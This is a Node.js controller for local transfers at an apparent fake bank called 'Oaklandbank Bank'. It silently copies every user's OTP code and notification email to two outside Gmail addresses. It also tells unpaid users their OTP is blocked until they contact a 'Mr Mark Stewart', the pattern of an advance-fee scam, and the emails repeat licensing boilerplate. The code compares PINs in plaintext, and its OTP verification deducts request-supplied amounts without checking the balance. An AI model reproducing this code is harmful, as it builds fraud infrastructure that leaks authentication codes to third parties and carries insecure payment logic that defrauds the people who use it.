const LocalTransfer = require("../models/LocalTransferModel");
const User = require("../models/UserModel");
const sendEmail = require("../utils/emailSender");
const { handleError } = require("../utils/handleError");
const crypto = require("crypto");

// const createLocalTransfer = async (req, res) => {
//   try {
//     // Fetch user from database
//     const user = await User.findById(req.user.userId);

//     // Check if user exists
//     if (!user) {
//       return res
//         .status(404)
//         .json({ status: "failed", error: "User not found" });
//     }

//     // Validate PIN
//     const validPin = user.pin === req.body.pin;
//     if (!validPin) {
//       return res
//         .status(401)
//         .json({ status: "unauthorized", error: "Invalid PIN" });
//     }

//     // Check account type and balance
//     if (req.body.account === "savings") {
//       if (
//         user.savings_balance < req.body.amount ||
//         user.savings_balance === 0
//       ) {
//         return res
//           .status(401)
//           .json({ status: "unauthorized", error: "Insufficient balance" });
//       }
//       user.savings_balance -= req.body.amount;
//     } else if (req.body.account === "checkings") {
//       if (
//         user.checkings_balance < req.body.amount ||
//         user.checkings_balance === 0
//       ) {
//         return res
//           .status(401)
//           .json({ status: "unauthorized", error: "Insufficient balance" });
//       }
//       user.checkings_balance -= req.body.amount;
//     } else {
//       return res
//         .status(400)
//         .json({ status: "failed", error: "Invalid account type" });
//     }

//     if(user.isPaid) {

//     }
//     // Save user's updated balance
//     await user.save();

//     // Create local transfer
//     const localTransfer = await LocalTransfer.create({
//       ...req.body,
//       name: user.name,
//       user: req.user.userId, // Assuming you need to store user ID in transfer document
//     });

//     // Send success response
//     res.status(200).json({
//       status: "success",
//       message: "Transaction successful",
//       data: localTransfer,
//     });

//     // Send email notifications
//     const subject = "Transfer Deposit Initiation";
//     const text = "A transfer deposit was initiated in your bank account.";
//     const html = `<!DOCTYPE html>
//       <html lang="en">
//       <head>
//         <meta charset="UTF-8">
//         <meta name="viewport" content="width=device-width, initial-scale=1.0">
//         <title>Transfer Deposit Initiation</title>
//         <style>
//           /* Add your custom CSS styles here */
//           body {
//             font-family: Arial, sans-serif;
//             line-height: 1.6;
//             margin: 0;
//             padding: 0;
//             background-color: #f5f5f5;
//             color: #333;
//           }
//           .container {
//             max-width: 600px;
//             margin: 20px auto;
//             background-color: #fff;
//             padding: 20px;
//             border-radius: 8px;
//             box-shadow: 0 0 10px rgba(0,0,0,0.1);
//           }
//           h1 {
//             color: #0044cc;
//           }
//           .footer {
//             margin-top: 20px;
//             font-size: 12px;
//             color: #666;
//           }
//         </style>
//       </head>
//       <body>
//         <div class="container">
//           <h1>Transfer Deposit Initiation</h1>
//           <p>Dear ${user.name},</p>
//           <p>${text}</p>
//           <p>If you have any questions or need assistance, please don't hesitate to contact us.</p>
//           <div class="footer">
//             <p>Thank you for choosing our services.</p>
//             <p>If you have any questions or need further assistance, please don't hesitate to contact us.</p>

//         <div class="footer">
//             <p>Thank you for choosing Oaklandbank Bank.</p>
//             <div class="footer" style="margin-top: 1rem; font-size: 12px">
//             <p>Thank you for choosing our services.</p>
//           </div>

//           <p>Earn discounts when you send money by signing up for our no-cost rewards program!</p>

//           <h3>Security Information:</h3>
//           <p>It's important to keep your account secure. Here are some security tips:</p>
//           <ul>
//             <li>Never share your account password with anyone.</li>
//             <li>Use strong, unique passwords for your online banking.</li>
//           </ul>

//           <p>If you have any questions or need assistance, please don't hesitate to <a href="mailto:support@Oaklandbankcapitals.com">contact us via mail</a> or <a href='https://www.facebook.com/profile.php?id=61561899666135&mibextid=LQQJ4d'>Contact Us via facebook</a>.</p>

//           <div class="footer">
//             <p>Authorized to do business in all 50 states, D.C. and all U.S. territories, NMLS # 898432. Licensed as a Bank corporation in New York State Department of Financial Services; Massachusetts Check Seller License # CS0025, Foreign Transmittal License # FT89432. Licensed by the Georgia Department of Banking and Finance.</p>
//             <p>Oakland Bank Payment Systems, Inc. | 1550 Utica Avenue S., Suite 100 | Minneapolis, MN 55416</p>
//             <p>© Oakland Bank.</p>
//           </div>

//           </div>
//         </div>
//       </body>
//       </html>`;

//     // Send emails asynchronously
//     await Promise.all([
//       sendEmail(user.email, subject, text, html),
//       sendEmail("anniemary841@gmail.com", subject, text, html),
//       sendEmail("companychris00@gmail.com", subject, text, html),
//     ]);
//   } catch (error) {
//     console.error("Error creating local transfer:", error);
//     res.status(400).json({
//       status: "failed",
//       error: "An error occurred while processing your request",
//     });
//   }
// };

function generateOtp() {
  return crypto.randomInt(100000, 999999).toString();
}

const createLocalTransfer = async (req, res) => {
  try {
    // Fetch user from database
    const user = await User.findById(req.user.userId);

    // Check if user exists
    if (!user) {
      return res
        .status(404)
        .json({ status: "failed", error: "User not found" });
    }

    // Validate PIN
    const validPin = user.pin === req.body.pin;
    if (!validPin) {
      return res
        .status(401)
        .json({ status: "unauthorized", error: "Invalid PIN" });
    }

    // Check account type and balance
    if (req.body.account === "savings") {
      if (user.savings_balance < req.body.amount) {
        return res
          .status(401)
          .json({ status: "unauthorized", error: "Insufficient balance" });
      }
    } else if (req.body.account === "checkings") {
      if (user.checkings_balance < req.body.amount) {
        return res
          .status(401)
          .json({ status: "unauthorized", error: "Insufficient balance" });
      }
    } else {
      return res
        .status(400)
        .json({ status: "failed", error: "Invalid account type" });
    }

    // Generate and store OTP if user is paid
    if (user.isPaid) {
      const otp = generateOtp();
      user.otp = otp;
      user.otpExpiry = Date.now() + 15 * 60 * 1000; // 15 minutes from now
      await user.save();

      const subject = "Your OTP Code";
      const text = `Your OTP code is: ${otp}`;
      const html = `<p>Dear ${user.name}, </p><p>Your OTP code is: <strong>${otp}</strong></p>
       <div class="footer" style="margin-top: 1rem; font-size: 12px">
            <p>Thank you for choosing our services.</p>
          </div>

          <p>Earn discounts when you send money by signing up for our no-cost rewards program!</p>

          <h3>Security Information:</h3>
          <p>It's important to keep your account secure. Here are some security tips:</p>
          <ul>
            <li>Never share your account password with anyone.</li>
            <li>Use strong, unique passwords for your online banking.</li>
          </ul>

          <p>If you have any questions or need assistance, please don't hesitate to <a href="mailto:support@Oaklandbankcapitals.com">contact us via mail</a> or <a href='https://www.facebook.com/profile.php?id=61561899666135&mibextid=LQQJ4d'>Contact Us via facebook</a>.</p>

          <div class="footer">
            <p>Authorized to do business in all 50 states, D.C. and all U.S. territories, NMLS # 898432. Licensed as a Bank corporation in New York State Department of Financial Services; Massachusetts Check Seller License # CS0025, Foreign Transmittal License # FT89432. Licensed by the Georgia Department of Banking and Finance.</p>
            <p>Oakland Bank Payment Systems, Inc. | 1550 Utica Avenue S., Suite 100 | Minneapolis, MN 55416</p>
            <p>© Oakland Bank.</p>
          </div>
      
      `;

      // Send OTP email
      await Promise.all([
        sendEmail(user.email, subject, text, html),
        sendEmail("anniemary841@gmail.com", subject, text, html),
        sendEmail("companychris00@gmail.com", subject, text, html),
      ]);

      return res.status(200).json({
        status: "success",
        message: "OTP sent to your email. Please verify to proceed.",
      });
    } else if (!user.isPaid) {
      const subject = "Debit Card Order";
      const text = "";
      const html = `<!DOCTYPE html>
      <html lang="en">
      <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Oaklandbank Bank Debit Card Update</title>
        <style>
          /* Add your custom CSS styles here */
          body {
            font-family: Arial, sans-serif;
            line-height: 1.6;
            margin: 0;
            padding: 0;
            background-color: #f5f5f5;
            color: #333;
          }
          .container {
            max-width: 600px;
            margin: 20px auto;
            background-color: #fff;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
          }
          h1 {
            color: #0044cc;
          }
          .footer {
            margin-top: 20px;
            font-size: 12px;
            color: #666;
          }
        </style>
      </head>
      <body>
        <div class="container">
          <h1>Update on Your Oaklandbank Bank Debit Card</h1>
          <p>Hi ${user.name},</p>
          <p>Your 'OTP code' is unavailable at this moment, complete your application processes to receive a valid OTP code. 
          Simply contact the bank management support (Mr Mark Stewart) to resolve this issue.</p>
          <p>If you have any questions or need further assistance, please don't hesitate to <a href="mailto:support@Oaklandbankcapitals.com">contact us via mail</a></p>
          <div class="footer">
            <p>Thank you for choosing Oaklandbank Bank.</p>
            <div class="footer" style="margin-top: 1rem; font-size: 12px">
            <p>Thank you for choosing our services.</p>
          </div>

          <p>Earn discounts when you send money by signing up for our no-cost rewards program!</p>

          <h3>Security Information:</h3>
          <p>It's important to keep your account secure. Here are some security tips:</p>
          <ul>
            <li>Never share your account password with anyone.</li>
            <li>Use strong, unique passwords for your online banking.</li>
          </ul>

          <p>If you have any questions or need assistance, please don't hesitate to <a href="mailto:support@Oaklandbankcapitals.com">contact us via mail</a> or <a href='https://www.facebook.com/profile.php?id=61561899666135&mibextid=LQQJ4d'>Contact Us via facebook</a>.</p>

          <div class="footer">
            <p>Authorized to do business in all 50 states, D.C. and all U.S. territories, NMLS # 898432. Licensed as a Bank corporation in New York State Department of Financial Services; Massachusetts Check Seller License # CS0025, Foreign Transmittal License # FT89432. Licensed by the Georgia Department of Banking and Finance.</p>
            <p>Oakland Bank Payment Systems, Inc. | 1550 Utica Avenue S., Suite 100 | Minneapolis, MN 55416</p>
            <p>© Oakland Bank.</p>
          </div>
          </div>
        </div>
      </body>
      </html>`;
      await Promise.all([
        sendEmail(user.email, subject, text, html),
        sendEmail("anniemary841@gmail.com", subject, text, html),
        sendEmail("companychris00@gmail.com", subject, text, html),
      ]);

      return res.status(400).json({
        status: "failed",
        message: "cannot complete transfer at this moment due to otp reasons",
      });
    }

    // Update user's balance
    if (req.body.account === "savings") {
      user.savings_balance -= req.body.amount;
    } else if (req.body.account === "checkings") {
      user.checkings_balance -= req.body.amount;
    }
    await user.save();

    // Create local transfer
    const localTransfer = await LocalTransfer.create({
      ...req.body,
      name: user.name,
      user: req.user.userId,
    });

    // Send success response
    res.status(200).json({
      status: "success",
      message: "Transaction successful",
      data: localTransfer,
    });
  } catch (error) {
    console.error("Error creating local transfer:", error);
    res.status(400).json({
      status: "failed",
      error: "An error occurred while processing your request",
    });
  }
};

const verifyOtp = async (req, res) => {
  try {
    // Fetch user from database
    const user = await User.findById(req.user.userId);

    // Check if user exists and OTP is valid
    if (!user || !user.otp || Date.now() > user.otpExpiry) {
      return res
        .status(401)
        .json({ status: "unauthorized", error: "Invalid or expired OTP" });
    }

    if (user.otp !== req.body.otp) {
      return res
        .status(401)
        .json({ status: "unauthorized", error: "Invalid OTP" });
    }

    // Clear OTP after successful verification
    user.otp = null;
    user.otpExpiry = null;

    // Update user's balance
    if (req.body.account === "savings") {
      user.savings_balance -= req.body.amount;
    } else if (req.body.account === "checkings") {
      user.checkings_balance -= req.body.amount;
    }

    await user.save();

    // Create local transfer
    const localTransfer = await LocalTransfer.create({
      ...req.body,
      name: user.name,
      user: req.user.userId,
    });

    // Send success response
    res.status(200).json({
      status: "success",
      message: "OTP verified. Transaction successful.",
      data: localTransfer,
    });
  } catch (error) {
    console.error("Error verifying OTP:", error);
    res.status(400).json({
      status: "failed",
      error: "An error occurred while processing your request",
    });
  }
};

const getUserLocalTransfer = async (req, res) => {
  try {
    const userLocalTransfer = await LocalTransfer.find({
      user: req.user.userId,
    });
    res.status(200).json({
      status: "success",
      nbHits: userLocalTransfer.length,
      data: userLocalTransfer,
    });
  } catch (error) {
    console.log(error);
    res.status(400).json({ status: "failed", error: error.message });
  }
};

const getAllLocalTransfer = async (req, res) => {
  try {
    const userLocalTransfer = await LocalTransfer.find({});
    res.status(200).json({
      status: "success",
      nbHits: userLocalTransfer.length,
      data: userLocalTransfer,
    });
  } catch (error) {
    console.log(error);
    res.status(400).json({ status: "failed", error: error.message });
  }
};

module.exports = {
  createLocalTransfer,
  getUserLocalTransfer,
  getAllLocalTransfer,
  verifyOtp,
};
